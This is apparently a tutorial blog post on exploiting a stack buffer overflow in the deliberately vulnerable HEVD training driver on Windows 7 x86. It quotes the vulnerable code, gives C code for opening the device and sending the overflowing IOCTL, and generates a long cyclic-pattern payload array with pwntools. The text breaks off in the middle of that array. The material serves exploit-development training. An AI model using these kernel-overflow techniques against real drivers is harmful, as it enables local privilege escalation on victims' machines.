---
layout: post
title:  "HEVD Exploitation Part 1 -- Win7 x86 Stack Overflow"
date:   2024-12-15
categories: [HEVD Exploitation Windows]
---
<br>
# Table of Contents
1. [Goal](#goal)
2. [Observing The Vulnerability](#observing-the-vulnerability)  
3. [Writing The Exploit](#writing-the-exploit)  
    a. [Obtaining A Handle To The Device](#obtaining-a-handle-to-the-device)  
    b. [Sending the IOCTL](#sending-the-ioctl)  
    c. [Determining The Size Of InputBuffer](#determining-the-size-of-inputbuffer)  
    d. [Creating and Returning to Our Shellcode Buffer](#creating-and-returning-to-our-shellcode-buffer)  
    e. [Writing the Token Stealing Shellcode](#writing-the-token-stealing-shellcode)


<br>
## Goal
The goal is to perform a Local Privilege Escalation by exploiting a stack buffer 
overflow in the [HackSys Extreme Vulnerable Driver's (HEVD)](https://github.com/
hacksysteam/HackSysExtremeVulnerableDriver) [TriggerBufferOverflowStack](https:
//github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/
Windows/BufferOverflowStack.c#L67) function to overwrite it's return address to 
point into a user mode shellcode buffer which will copy the system's security 
token into the current process.  
<br>
## Observing The Vulnerability
The vulnerability we will be exploiting is in the `TriggerBufferOverflowStack` 
function. See if you can spot it below:  
<br>
```c++
__declspec(safebuffers)
NTSTATUS
TriggerBufferOverflowStack(
    _In_ PVOID UserBuffer,
    _In_ SIZE_T Size
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    ULONG KernelBuffer[BUFFER_SIZE] = { 0 };

    PAGED_CODE();

    __try
    {
        // Verify if the buffer resides in user mode
        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));

        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%zX\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%zX\n", sizeof(KernelBuffer));

#ifdef SECURE
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));
#else
        DbgPrint("[+] Triggering Buffer Overflow in Stack\n");
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}
```
<br>
Inside the `#else` portion of the `#ifdef SECURE` condition, `RtlCopyMemory` 
copies a user-supplied buffer and size into a fixed size kernel stack buffer 
`KernelBuffer` which has a size of `BUFFER_SIZE` (512). The buffer is an array 
of `ULONGs` which are 4 bytes each, so the size of the KernelBuffer array in 
bytes is `BUFFER_SIZE` \* `ULONG` = 2048 bytes. If we can provide a size 
larger than 2048 it will write past the end of the buffer causing an overflow.  
<br>
## Writing The Exploit
<br>
### Obtaining A Handle To The Device
<br>
First we need to obtain a handle to the device the driver creates which we can 
see is created in [HacksysExtremeVulnerableDriver.c](https://github.com/
hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/
HackSysExtremeVulnerableDriver.c#L69):  
<br>
```c
NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{
    ...
    UNICODE_STRING DeviceName = { 0 };
    ...
    RtlInitUnicodeString(&DeviceName, L"\\Device\\HackSysExtremeVulnerableDriver");
    ...
    /* Create the device */
    Status = IoCreateDevice(
        DriverObject,
        0,
        &DeviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &DeviceObject
    );
    ...
}
```
<br>
The 'Remarks' section of the MSDN page for [DeviceIoControl](https://learn.micro
soft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol#remarks) 
detail what the 'lpFileName' parameter for CreateFile(A|W) should be when 
opening a handle for a device.

>To retrieve a handle to the device, you must call the [CreateFile](https://
learn.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-createfilea) 
function with either the name of a device or the name of the driver associated 
with a device. To specify a device name, use the following format:
>
>\\\\.\\_DeviceName_

<br>
We can obtain the device name from the HackSysExtremeVulnerableDriver (HEVD) 
source code above.  
<br>
The `DeviceIoControl` help page also details what other parameter to 
`CreateFile` should be when opening a handle to a device:

> You should specify the **FILE_SHARE_READ** and **FILE_SHARE_WRITE** access 
flags when calling CreateFile to open a handle to a device driver...
>
> - The _fdwCreate_ parameter must specify **OPEN_EXISTING**.
> - The _hTemplateFile_ parameter must be **NULL**.
> - ...  

<br>
Obtaining a handle to the device:  
<br>
```c
const char* lpFileName = "\\\\.\\HackSysExtremeVulnerableDriver";

int main()
{
    HANDLE hHEVD = CreateFileA(lpFileName,
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL);
}
```
<br>  

---

**CAUTION**  
Be careful with the return value of CreateFile, It returns 
__INVALID\_FILE\_HANDLE__ on error \_\_not\_\_ NULL or 0.

---

<br>
### Sending the IOCTL
<br>
Now that we have a handle to the device, we need to obtain the IOCTL value for 
functionality we want to call in the driver. We can see which IOCTLs correspond 
to what driver functionality in HEVD by looking at the [IrpDeviceIoCtlHandler](h
ttps://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/
HEVD/Windows/HackSysExtremeVulnerableDriver.c#L256) function, which essentially 
acts as an IOCTL dispatcher.  
<br>
```c
NTSTATUS
IrpDeviceIoCtlHandler(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    ULONG IoControlCode = 0;
    PIO_STACK_LOCATION IrpSp = NULL;
    ...
    IrpSp = IoGetCurrentIrpStackLocation(Irp);

    if (IrpSp)
    {
        IoControlCode = IrpSp->Parameters.DeviceIoControl.IoControlCode;

        switch (IoControlCode)
        {
        case HEVD_IOCTL_BUFFER_OVERFLOW_STACK:
            DbgPrint("****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n");
            Status = BufferOverflowStackIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n");
            break;
    ...
}
```
<br>
From the HEVD source above, _HEVD\_IOCTL\_BUFFER\_OVERFLOW\_STACK_  is the IOCTL 
value which will result in [BufferOverflowStackIoctlHandler](https://github.com/
hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/
BufferOverflowStack.c#L128) to be called which then calls the vulnerable 
`TriggerBufferOverflowStack` function we saw in the 
[Observing The Vulnerability](#observing-the-vulnerability) section. 
(HEVD\_IOCTL\_BUFFER\_OVERFLOW\_STACK is a macro):  
<br>
```c
#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)

#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK   IOCTL(0x800)
```
<br>
`CTL_CODE` is a macro defined in `Wdm.h` and `Ntddk.h`. Rather than include one 
of these headers and deal with the headache that comes with fixing the build 
system for the exploit its easier to just copy the implementation of `CTL_CODE` 
and `IOCTL` into your exploit to recreate these IOCTL values.  
<br>
To send an IOCTL message to a driver, we will also need and in-buffer of content 
we want to send to the driver and an out-buffer for the IOCTL to return 
information into.  
<br>
`BufferOverflowIoctlHandler` gets the input buffer and the input buffer length 
from the `PIO_STACK_LOCATION` structure and passes those values to 
`TriggerBufferOverflowStack`.  
<br>
```c
NTSTATUS
BufferOverflowStackIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    SIZE_T Size = 0;
    PVOID UserBuffer = NULL;
    ...

    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
    Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;

    if (UserBuffer)
    {
        Status = TriggerBufferOverflowStack(UserBuffer, Size);
    }
    ...
}
```
<br>
Lets create our InBuffer to send to the driver:  
<br>
```c
HANDLE hHeap = GetProcessHeap();
LPVOID InBuffer = HeapAlloc(hHeap, HEAP_NO_SERIALIZE | HEAP_ZERO_MEMORY, 2048);
```
<br>
This buffer isn't big enough yet to overflow the kernel stack buffer but we will 
increase the size in a moment. First we will implement the remaining code 
required to send the IOCTL. This entails just calling the `DeviceIoControl` 
function.  
<br>
```c
DWORD lpBytesReturned = 0;
BOOL IOCTLSent = DeviceIoControl(
    hHEVD,                                   // Handle to the Device we want to send an IOCTL to
    HEVD_IOCTL_BUFFER_OVERFLOW_STACK,        // IOCTL value
    InBuffer,                                // Buffer of contents we want to send to driver
    2048,                                    // Size of in buffer
    NULL,                                    // Out buffer (Not needed)
    0,                                       // Size of out buffer
    &lpBytesReturned,                        // lpBytesReturned
    NULL                                     // lpOverlapped (Not needed)
    );
```
<br>
This shouldn't cause an overflow as the input buffer is of equal size to the 
kernel stack buffer. However we can change the input buffer to be whatever size 
we would like; specifically we want to know how big does our buffer need to be 
exactly so that we can reliably overflow the return address of the 
`TriggerBufferOverflowStack` function.  
<br>
### Determining The Size Of InputBuffer
<br>
To obtain the desired size of our input buffer we can use a variation of 
the _pattern\_create_  and _pattern\_find_ tools found in [mona.py](https://gith
ub.com/corelan/mona). I will use an equivalent too called `cyclic` found in the 
python package [pwntools](https://docs.pwntools.com/en/stable/).  
<br>
If you are unfamiliar with these tools, they generate a non-repeating pattern of 
bytes for a given size, which you can use as the contents of a buffer in a stack
buffer overflow. This will cause the return address of the function to be 
overwritten by some portion of the non-repeating pattern ultimately redirecting
the instruction pointer to some bogus address when the function returns. You can
then observe the address the instruction pointer was redirected to, pass that 
value into the pattern\_find (or equivalent) too and it will tell you how big 
your malicious input  needs to be to overwrite the return address.  
<br>
We know that the kernel stack buffer is 2048 bytes, so we need to generate and 
amount of bytes at least bigger than 2048. I will pick a size of around 2100.  
<br>
The following is how you can use `cyclic_gen()` in pwntools to generate a 2100 
byte buffer of non-repeating patterns. After we generate the bytes we will 
write them to a file and use `xxd` ( You may need to install xxd via 
[scoop](https://scoop.sh/) or other means ) to output them in a C-style buffer 
so we can copy them over to our exploit.  
<br>

---

**TIP**  
The pwntools cyclic generator will create a new pattern for every generator you 
create, hence it is important to use the same generator to find the pattern as 
you used to create the pattern. i.e. You have to run this in a python REPL, and 
keep that REPL active whilst your perform the next few steps so that later when 
you have a value from EIP that you want to pass to generator.find() the 
generator will be the same one you used to create the pattern.

---

<br>
```python
from pwn import *

generator = cyclic_gen()

buffer = generator.get(2100)

with open('Ring0Payload', 'wb') as f:
    f.write(buffer) 
```
<br>
```powershell
xxd -i Ring0Payload
```
<br>
```c
> unsigned char __Ring0Payload[] = {
  0x7a, 0x61, 0x61, 0x76, 0x62, 0x61, 0x61, 0x76, 0x63, 0x61, 0x61, 0x76,
  0x64, 0x61, 0x61, 0x76, 0x65, 0x61, 0x61, 0x76, 0x66, 0x61, 0x61, 0x76,
  0x67, 0x61, 0x61, 0x76, 0x68, 0x61, 0x61, 0x76, 0x69, 0x61, 0x61, 0x76,
  0x6a, 0x61, 0x61, 0x76, 0x6b, 0x61, 0x61, 0x76, 0x6c, 0x61, 0x61, 0x76,
  0x6d, 0x61, 0x61, 0x76, 0x6e, 0x61, 0x61, 0x76, 0x6f, 0x61, 0x61, 0x76,
  0x70, 0x61, 0x61, 0x76, 0x71, 0x61, 0x61, 0x76, 0x72, 0x61, 0x61, 0x76,
  0x73, 0x61, 0x61, 0x76, 0x74, 0x61, 0x61, 0x76, 0x75, 0x61, 0x61, 0x76,
  0x76, 0x61, 0x61, 0x76, 0x77, 0x61, 0x61, 0x76, 0x78, 0x61, 0x61, 0x76,
  0x79, 0x61, 0x61, 0x76, 0x7a, 0x61, 0x61, 0x77, 0x62, 0x61, 0x61, 0x77,
  0x63, 0x61, 0x61, 0x77, 0x64, 0x61, 0x61, 0x77, 0x65, 0x61, 0x61, 0x77,
  0x66, 0x61, 0x61, 0x77, 0x67, 0x61, 0x61, 0x77, 0x68, 0x61, 0x61, 0x77,
  0x69, 0x61, 0x61, 0x77, 0x6a, 0x61, 0x61, 0x77, 0x6b, 0x61, 0x61, 0x77,
  0x6c, 0x61, 0x61, 0x77, 0x6d, 0x61, 0x61, 0x77, 0x6e, 0x61, 0x61, 0x77,
  0x6f, 0x61, 0x61, 0x77, 0x70, 0x61, 0x61, 0x77, 0x71, 0x61, 0x61, 0x77,
  0x72, 0x61, 0x61, 0x77, 0x73, 0x61, 0x61, 0x77, 0x74, 0x61, 0x61, 0x77,
  0x75, 0x61, 0x61, 0x77, 0x76, 0x61, 0x61, 0x77, 0x77, 0x61, 0x61, 0x77,
  0x78, 0x61, 0x61, 0x77, 0x79, 0x61, 0x61, 0x77, 0x7a, 0x61, 0x61, 0x78,
  0x62, 0x61, 0x61, 0x78, 0x63, 0x61, 0x61, 0x78, 0x64, 0x61, 0x61, 0x78,
  0x65, 0x61, 0x61, 0x78, 0x66, 0x61, 0x61, 0x78, 0x67, 0x61, 0x61, 0x78,
  0x68, 0x61, 0x61, 0x78, 0x69, 0x61, 0x61, 0x78, 0x6a, 0x61, 0x61, 0x78,
  0x6b, 0x61, 0x61, 0x78, 0x6c, 0x61, 0x61, 0x78, 0x6d, 0x61, 0x61, 0x78,
  0x6e, 0x61, 0x61, 0x78, 0x6f, 0x61, 0x61, 0x78, 0x70, 0x61, 0x61, 0x78,
  0x71, 0x61, 0x61, 0x78, 0x72, 0x61, 0x61, 0x78, 0x73, 0x61, 0x61, 0x78,
  0x74, 0x61, 0x61, 0x78, 0x75, 0x61, 0x61, 0x78, 0x76, 0x61, 0x61, 0x78,
  0x77, 0x61, 0x61, 0x78, 0x78, 0x61, 0x61, 0x78, 0x79, 0x61, 0x61, 0x78,
  0x7a, 0x61, 0x61, 0x79, 0x62, 0x61, 0x61, 0x79, 0x63, 0x61, 0x61, 0x79,
  0x64, 0x61, 0x61, 0x79, 0x65, 0x61, 0x61, 0x79, 0x66, 0x61, 0x61, 0x79,
  0x67, 0x61, 0x61, 0x79, 0x68, 0x61, 0x61, 0x79, 0x69, 0x61, 0x61, 0x79,
  0x6a, 0x61, 0x61, 0x79, 0x6b, 0x61, 0x61, 0x79, 0x6c, 0x61, 0x61, 0x79,
  0x6d, 0x61, 0x61, 0x79, 0x6e, 0x61, 0x61, 0x79, 0x6f, 0x61, 0x61, 0x79,
  0x70, 0x61, 0x61, 0x79, 0x71, 0x61, 0x61, 0x79, 0x72, 0x61, 0x61, 0x79,
  0x73, 0x61, 0x61, 0x79, 0x74, 0x61, 0x61, 0x79, 0x75, 0x61, 0x61, 0x79,
  0x76, 0x61, 0x61, 0x79, 0x77, 0x61, 0x61, 0x79, 0x78, 0x61, 0x61, 0x79,
  0x79, 0x61, 0x61, 0x79, 0x7a, 0x61, 0x61, 0x7a, 0x62, 0x61, 0x61, 0x7a,
  0x63, 0x61, 0x61, 0x7a, 0x64, 0x61, 0x61, 0x7a, 0x65, 0x61, 0x61, 0x7a,
  0x66, 0x61, 0x61, 0x7a, 0x67, 0x61, 0x61, 0x7a, 0x68, 0x61, 0x61, 0x7a,
  0x69, 0x61, 0x61, 0x7a, 0x6a, 0x61, 0x61, 0x7a, 0x6b, 0x61, 0x61, 0x7a,
  0x6c, 0x61, 0x61, 0x7a, 0x6d, 0x61, 0x61, 0x7a, 0x6e, 0x61, 0x61, 0x7a,
  0x6f, 0x61, 0x61, 0x7a, 0x70, 0x61, 0x61, 0x7a, 0x71, 0x61, 0x61, 0x7a,
  0x72, 0x61, 0x61, 0x7a, 0x73, 0x61, 0x61, 0x7a, 0x74, 0x61, 0x61, 0x7a,
  0x75, 0x61, 0x61, 0x7a, 0x76, 0x61, 0x61, 0x7a, 0x77, 0x61, 0x61, 0x7a,
  0x78, 0x61, 0x61, 0x7a, 0x79, 0x61, 0x61, 0x7a, 0x7a, 0x61, 0x62, 0x61,
  0x62, 0x61, 0x63, 0x61, 0x62, 0x61, 0x64, 0x61, 0x62, 0x61, 0x65, 0x61,
  0x62, 0x61, 0x66, 0x61, 0x62, 0x61, 0x67, 0x61, 0x62, 0x61, 0x68, 0x61,
  0x62, 0x61, 0x69, 0x61, 0x62, 0x61, 0x6a, 0x61, 0x62, 0x61, 0x6b, 0x61,
  0x62, 0x61, 0x6c, 0x61, 0x62, 0x61, 0x6d, 0x61, 0x62, 0x61, 0x6e, 0x61,
  0x62, 0x61, 0x6f, 0x61, 0x62, 0x61, 0x70, 0x61, 0x62, 0x61, 0x71, 0x61,
  0x62, 0x61, 0x72, 0x61, 0x62, 0x61, 0x73, 0x61, 0x62, 0x61, 0x74, 0x61,
  0x62, 0x61, 0x75, 0x61, 0x62, 0x61, 0x76, 0x61, 0x62, 0x61, 0x77, 0x61,
  0x62, 0x61, 0x78, 0x61, 0x62, 0x61, 0x79, 0x61, 0x62, 0x61, 0x7a, 0x61,
  0x62, 0x62, 0x62, 0x61, 0x62, 0x62, 0x63, 0x61, 0x62, 0x62, 0x64, 0x61,
  0x62, 0x62, 0x65, 0x61, 0x62, 0x62, 0x66, 0x61, 0x62, 0x62, 0x67, 0x61,
  0x62, 0x62, 0x68, 0x61, 0x62, 0x62, 0x69, 0x61, 0x62, 0x62, 0x6a, 0x61,
  0x62, 0x62, 0x6b, 0x61, 0x62, 0x62, 0x6c, 0x61, 0x62, 0x62, 0x6d, 0x61,
  0x62, 0x62, 0x6e, 0x61, 0x62, 0x62, 0x6f, 0x61, 0x62, 0x62, 0x70, 0x61,
  0x62, 0x62, 0x71, 0x61, 0x62, 0x62, 0x72, 0x61, 0x62, 0x62, 0x73, 0x61,
  0x62, 0x62, 0x74, 0x61, 0x62, 0x62, 0x75, 0x61, 0x62, 0x62, 0x76, 0x61,
  0x62, 0x62, 0x77, 0x61, 0x62, 0x62, 0x78, 0x61, 0x62, 0x62, 0x79, 0x61,
  0x62, 0x62, 0x7a, 0x61, 0x62, 0x63, 0x62, 0x61, 0x62, 0x63, 0x63, 0x61,
  0x62, 0x63, 0x64, 0x61, 0x62, 0x63, 0x65, 0x61, 0x62, 0x63, 0x66, 0x61,
  0x62, 0x63, 0x67, 0x61, 0x62, 0x63, 0x68, 0x61, 0x62, 0x63, 0x69, 0x61,
  0x62, 0x63, 0x6a, 0x61, 0x62, 0x63, 0x6b, 0x61, 0x62, 0x63, 0x6c, 0x61,
  0x62, 0x63, 0x6d, 0x61, 0x62, 0x63, 0x6e, 0x61, 0x62, 0x63, 0x6f, 0x61,
  0x62, 0x63, 0x70, 0x61, 0x62, 0x63, 0x71, 0x61, 0x62, 0x63, 0x72, 0x61,
  0x62, 0x63, 0x73, 0x61, 0x62, 0x63, 0x74, 0x61, 0x62, 0x63, 0x75, 0x61,
  0x62, 0x63, 0x76, 0x61, 0x62, 0x63, 0x77, 0x61, 0x62, 0x63, 0x78, 0x61,
  0x62, 0x63, 0x79, 0x61, 0x62, 0x63, 0x7a, 0x61, 0x62, 0x64, 0x62, 0x61,
  0x62, 0x64, 0x63, 0x61, 0x62, 0x64, 0x64, 0x61, 0x62, 0x64, 0x65, 0x61,
  0x62, 0x64, 0x66, 0x61, 0x62, 0x64, 0x67, 0x61, 0x62, 0x64, 0x68, 0x61,
  0x62, 0x64, 0x69, 0x61, 0x62, 0x64, 0x6a, 0x61, 0x62, 0x64, 0x6b, 0x61,
  0x62, 0x64, 0x6c, 0x61, 0x62, 0x64, 0x6d, 0x61, 0x62, 0x64, 0x6e, 0x61,
  0x62, 0x64, 0x6f, 0x61, 0x62, 0x64, 0x70, 0x61, 0x62, 0x64, 0x71, 0x61,
  0x62, 0x64, 0x72, 0x61, 0x62, 0x64, 0x73, 0x61, 0x62, 0x64, 0x74, 0x61,
  0x62, 0x64, 0x75, 0x61, 0x62, 0x64, 0x76, 0x61, 0x62, 0x64, 0x77, 0x61,
  0x62, 0x64, 0x78, 0x61, 0x62, 0x64, 0x79, 0x61, 0x62, 0x64, 0x7a, 0x61,
  0x62, 0x65, 0x62, 0x61, 0x62, 0x65, 0x63, 0x61, 0x62, 0x65, 0x64, 0x61,
  0x62, 0x65, 0x65, 0x61, 0x62, 0x65, 0x66, 0x61, 0x62, 0x65, 0x67, 0x61,
  0x62, 0x65, 0x68, 0x61, 0x62, 0x65, 0x69, 0x61, 0x62, 0x65, 0x6a, 0x61,
  0x62, 0x65, 0x6b, 0x61, 0x62, 0x65, 0x6c, 0x61, 0x62, 0x65, 0x6d, 0x61,
  0x62, 0x65, 0x6e, 0x61, 0x62, 0x65, 0x6f, 0x61, 0x62, 0x65, 0x70, 0x61,
  0x62, 0x65, 0x71, 0x61, 0x62, 0x65, 0x72, 0x61, 0x62, 0x65, 0x73, 0x61,
  0x62, 0x65, 0x74, 0x61, 0x62, 0x65, 0x75, 0x61, 0x62, 0x65, 0x76, 0x61,
  0x62, 0x65, 0x77, 0x61, 0x62, 0x65, 0x78, 0x61, 0x62, 0x65, 0x79, 0x61,
  0x62, 0x65, 0x7a, 0x61, 0x62, 0x66, 0x62, 0x61, 0x62, 0x66, 0x63, 0x61,
  0x62, 0x66, 0x64, 0x61, 0x62, 0x66, 0x65, 0x61, 0x62, 0x66, 0x66, 0x61,
  0x62, 0x66, 0x67, 0x61, 0x62, 0x66, 0x68, 0x61, 0x62, 0x66, 0x69, 0x61,
  0x62, 0x66, 0x6a, 0x61, 0x62, 0x66, 0x6b, 0x61, 0x62, 0x66, 0x6c, 0x61,
  0x62, 0x66, 0x6d, 0x61, 0x62, 0x66, 0x6e, 0x61, 0x62, 0x66, 0x6f, 0x61,
  0x62, 0x66, 0x70, 0x61, 0x62, 0x66, 0x71, 0x61, 0x62, 0x66, 0x72, 0x61,
  0x62, 0x66, 0x73, 0x61, 0x62, 0x66, 0x74, 0x61, 0x62, 0x66, 0x75, 0x61,
  0x62, 0x66, 0x76, 0x61, 0x62, 0x66, 0x77, 0x61, 0x62, 0x66, 0x78, 0x61,
  0x62, 0x66, 0x79, 0x61, 0x62, 0x66, 0x7a, 0x61, 0x62, 0x67, 0x62, 0x61,
  0x62, 0x67, 0x63, 0x61, 0x62, 0x67, 0x64, 0x61, 0x62, 0x67, 0x65, 0x61,
  0x62, 0x67, 0x66, 0x61, 0x62, 0x67, 0x67, 0x61, 0x62, 0x67, 0x68, 0x61,
  0x62, 0x67, 0x69, 0x61, 0x62, 0x67, 0x6a, 0x61, 0x62, 0x67, 0x6b, 0x61,
  0x62, 0x67, 0x6c, 0x61, 0x62, 0x67, 0x6d, 0x61, 0x62, 0x67, 0x6e, 0x61,
  0x62, 0x67, 0x6f, 0x61, 0x62, 0x67, 0x70, 0x61, 0x62, 0x67, 0x71, 0x61,
  0x62, 0x67, 0x72, 0x61, 0x62, 0x67, 0x73, 0x61, 0x62, 0x67, 0x74, 0x61,
  0x62, 0x67, 0x75, 0x61, 0x62, 0x67, 0x76, 0x61, 0x62, 0x67, 0x77, 0x61,
  0x62, 0x67, 0x78, 0x61, 0x62, 0x67, 0x79, 0x61, 0x62, 0x67, 0x7a, 0x61,
  0x62, 0x68, 0x62, 0x61, 0x62, 0x68, 0x63, 0x61, 0x62, 0x68, 0x64, 0x61,
  0x62, 0x68, 0x65, 0x61, 0x62, 0x68, 0x66, 0x61, 0x62, 0x68, 0x67, 0x61,
  0x62, 0x68, 0x68, 0x61, 0x62, 0x68, 0x69, 0x61, 0x62, 0x68, 0x6a, 0x61,
  0x62, 0x68, 0x6b, 0x61, 0x62, 0x68, 0x6c, 0x61, 0x62, 0x68, 0x6d, 0x61,
  0x62, 0x68, 0x6e, 0x61, 0x62, 0x68, 0x6f, 0x61, 0x62, 0x68, 0x70, 0x61,
  0x62, 0x68, 0x71, 0x61, 0x62, 0x68, 0x72, 0x61, 0x62, 0x68, 0x73, 0x61,
  0x62, 0x68, 0x74, 0x61, 0x62, 0x68, 0x75, 0x61, 0x62, 0x68, 0x76, 0x61,
  0x62, 0x68, 0x77, 0x61, 0x62, 0x68, 0x78, 0x61, 0x62, 0x68, 0x79, 0x61,
  0x62, 0x68, 0x7a, 0x61, 0x62, 0x69, 0x62, 0x61, 0x62, 0x69, 0x63, 0x61,
  0x62, 0x69, 0x64, 0x61, 0x62, 0x69, 0x65, 0x61, 0x62, 0x69, 0x66, 0x61,
  0x62, 0x69, 0x67, 0x61, 0x62, 0x69, 0x68, 0x61, 0x62, 0x69, 0x69, 0x61,
  0x62, 0x69, 0x6a, 0x61, 0x62, 0x69, 0x6b, 0x61, 0x62, 0x69, 0x6c, 0x61,
  0x62, 0x69, 0x6d, 0x61, 0x62, 0x69, 0x6e, 0x61, 0x62, 0x69, 0x6f, 0x61,
  0x62, 0x69, 0x70, 0x61, 0x62, 0x69, 0x71, 0x61, 0x62, 0x69, 0x72, 0x61,
  0x62, 0x69, 0x73, 0x61, 0x62, 0x69, 0x74, 0x61, 0x62, 0x69, 0x75, 0x61,
  0x62, 0x69, 0x76, 0x61, 0x62, 0x69, 0x77, 0x61, 0x62, 0x69, 0x78, 0x61,
  0x62, 0x69, 0x79, 0x61, 0x62, 0x69, 0x7a, 0x61, 0x62, 0x6a, 0x62, 0x61,
  0x62, 0x6a, 0x63, 0x61, 0x62, 0x6a, 0x64, 0x61, 0x62, 0x6a, 0x65, 0x61,
  0x62, 0x6a, 0x66, 0x61, 0x62, 0x6a, 0x67, 0x61, 0x62, 0x6a, 0x68, 0x61,
  0x62, 0x6a, 0x69, 0x61, 0x62, 0x6a, 0x6a, 0x61, 0x62, 0x6a, 0x6b, 0x61,
  0x62, 0x6a, 0x6c, 0x61, 0x62, 0x6a, 0x6d, 0x61, 0x62, 0x6a, 0x6e, 0x61,
  0x62, 0x6a, 0x6f, 0x61, 0x62, 0x6a, 0x70, 0x61, 0x62, 0x6a, 0x71, 0x61,
  0x62, 0x6a, 0x72, 0x61, 0x62, 0x6a, 0x73, 0x61, 0x62, 0x6a, 0x74, 0x61,
  0x62, 0x6a, 0x75, 0x61, 0x62, 0x6a, 0x76, 0x61, 0x62, 0x6a, 0x77, 0x61,
  0x62, 0x6a, 0x78, 0x61, 0x62, 0x6a, 0x79, 0x61, 0x62, 0x6a, 0x7a, 0x61,
  0x62, 0x6b, 0x62, 0x61, 0x62, 0x6b, 0x63, 0x61, 0x62, 0x6b, 0x64, 0x61,
  0x62, 0x6b, 0x65, 0x61, 0x62, 0x6b, 0x66, 0x61, 0x62, 0x6b, 0x67, 0x61,
  0x62, 0x6b, 0x68, 0x61, 0x62, 0x6b, 0x69, 0x61, 0x62, 0x6b, 0x6a, 0x61,
  0x62, 0x6b, 0x6b, 0x61, 0x62, 0x6b, 0x6c, 0x61, 0x62, 0x6b, 0x6d, 0x61,
  0x62, 0x6b, 0x6e, 0x61, 0x62, 0x6b, 0x6f, 0x61, 0x62, 0x6b, 0x70, 0x61,
  0x62, 0x6b, 0x71, 0x61, 0x62, 0x6b, 0x72, 0x61, 0x62, 0x6b, 0x73, 0x61,
  0x62, 0x6b, 0x74, 0x61, 0x62, 0x6b, 0x75, 0x61, 0x62, 0x6b, 0x76, 0x61,
  0x62, 0x6b, 0x77, 0x61, 0x62, 0x6b, 0x78, 0x61, 0x62, 0x6b, 0x79, 0x61,
  0x62, 0x6b, 0x7a, 0x61, 0x62, 0x6c, 0x62, 0x61, 0x62, 0x6c, 0x63, 0x61,
  0x62, 0x6c, 0x64, 0x61, 0x62, 0x6c, 0x65, 0x61, 0x62, 0x6c, 0x66, 0x61,
  0x62, 0x6c, 0x67, 0x61, 0x62, 0x6c, 0x68, 0x61, 0x62, 0x6c, 0x69, 0x61,
  0x62, 0x6c, 0x6a, 0x61, 0x62, 0x6c, 0x6b, 0x61, 0x62, 0x6c, 0x6c, 0x61,
  0x62, 0x6c, 0x6d, 0x61, 0x62, 0x6c, 0x6e, 0x61, 0x62, 0x6c, 0x6f, 0x61,
  0x62, 0x6c, 0x70, 0x61, 0x62, 0x6c, 0x71, 0x61, 0x62, 0x6c, 0x72, 0x61,
  0x62, 0x6c, 0x73, 0x61, 0x62, 0x6c, 0x74, 0x61, 0x62, 0x6c, 0x75, 0x61,
  0x62, 0x6c, 0x76, 0x61, 0x62, 0x6c, 0x77, 0x61, 0x62, 0x6c, 0x78, 0x61,
  0x62, 0x6c, 0x79, 0x61, 0x62, 0x6c, 0x7a, 0x61, 0x62, 0x6d, 0x62, 0x61,
  0x62, 0x6d, 0x63, 0x61, 0x62, 0x6d, 0x64, 0x61, 0x62, 0x6d, 0x65, 0x61,
  0x62, 0x6d, 0x66, 0x61, 0x62, 0x6d, 0x67, 0x61, 0x62, 0x6d, 0x68, 0x61,
  0x62, 0x6d, 0x69, 0x61, 0x62, 0x6d, 0x6a, 0x61, 0x62, 0x6d, 0x6b, 0x61,
  0x62, 0x6d, 0x6c, 0x61, 0x62, 0x6d, 0x6d, 0x61, 0x62, 0x6d, 0x6e, 0x61,
  0x62, 0x6d, 0x6f, 0x61, 0x62, 0x6d, 0x70, 0x61, 0x62, 0x6d, 0x71, 0x61,
  0x62, 0x6d, 0x72, 0x61, 0x62, 0x6d, 0x73, 0x61, 0x62, 0x6d, 0x74, 0x61,
  0x62, 0x6d, 0x75, 0x61, 0x62, 0x6d, 0x76, 0x61, 0x62, 0x6d, 0x77, 0x61,
  0x62, 0x6d, 0x78, 0x61, 0x62, 0x6d, 0x79, 0x61, 0x62, 0x6d, 0x7a, 0x61,
  0x62, 0x6e, 0x62, 0x61, 0x62, 0x6e, 0x63, 0x61, 0x62, 0x6e, 0x64, 0x61,
  0x62, 0x6e, 0x65, 0x61, 0x62, 0x6e, 0x66, 0x61, 0x62, 0x6e, 0x67, 0x61,
